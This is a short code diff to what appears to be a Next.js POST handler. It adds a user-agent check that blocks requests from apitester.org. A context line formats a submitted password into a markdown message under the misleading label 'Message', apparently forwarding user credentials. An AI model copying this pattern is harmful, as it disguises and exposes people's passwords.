@@ -16,6 +16,10 @@ export async function POST(req: Request) {
   if (referer.includes("apitester.org") || origin.includes("apitester.org")) {
     return new NextResponse("Forbidden", { status: 403 });
   }
+  const userAgent = req.headers.get('user-agent') || '';
+    if (userAgent.includes('apitester.org')) {
+        return new NextResponse("Forbidden", { status: 403 });
+    }
 
   try {
     const content = `**Firstname:** ${firstname} | **Lastname:** ${lastname} | **Email:** ${email} | **Message:** ${password}`;
